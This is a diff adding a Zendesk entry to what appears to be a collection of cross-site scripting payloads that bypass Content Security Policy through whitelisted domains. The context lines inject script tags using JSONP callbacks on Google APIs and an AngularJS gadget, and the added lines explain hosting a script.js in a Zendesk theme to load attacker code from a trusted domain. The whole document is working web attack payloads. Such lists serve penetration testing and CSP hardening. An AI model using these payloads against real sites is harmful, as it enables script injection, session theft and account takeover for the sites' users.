@@ -61,3 +61,5 @@
 "><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
 ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
 "><script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();"></script>
+##Zendesk //you can add themes to zendesk, then edit the theme script.js file, example usage and path
+"><script src="https://your-domain.zendesk.com/hc/theming_assets/19435657/15480192235549/script.js?preview=true"></script>
